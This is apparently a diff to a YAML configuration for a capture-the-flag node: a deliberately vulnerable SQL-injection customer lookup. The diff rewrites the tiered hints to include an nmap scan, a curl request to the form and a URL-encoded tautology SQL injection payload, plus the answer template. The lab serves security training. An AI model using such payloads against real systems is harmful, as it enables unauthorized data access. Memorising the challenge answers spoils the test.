@@ -4,7 +4,7 @@ kind: flag-node-generator
 name: 'HTTP: SQLi Customer Lookup'
 description: No-login HTTP customer lookup with a deliberately vulnerable SQL query
   and realistic support records.
-hint_template: Probe the customer lookup before moving to {{NEXT_NODE_NAME}}.
+hint_template: Consider how search input affects which records are returned.
 runtime:
   type: docker-compose
   compose_file: docker-compose.yml
@@ -71,10 +71,23 @@ access_instructions:
     instructions: Record the flag from the hidden SQL result row.
 hint_levels:
   low:
-  - Probe the customer lookup before moving to {{NEXT_NODE_NAME}}.
+  - Consider how search input affects which records are returned.
   medium:
-  - 'File/artifact: {{OUTPUT.File(path):basename}}'
+  - 'Service: SQL Injection in Customer Lookup. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
+  - |-
+    Check the assigned port:
+    ```bash
+    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
+    ```
   high:
-  - Open the lookup form
-  - Use a tautology payload
-  - 'Record the hidden row: Record the flag from the hidden SQL result row.'
+  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
+  - |-
+    Open the lookup form:
+    ```bash
+    curl 'http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/search?customer=Acme%20Health'
+    ```
+  - |-
+    Use a tautology payload:
+    ```bash
+    curl "http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/search?customer=%27%20OR%20%271%27=%271"
+    ```
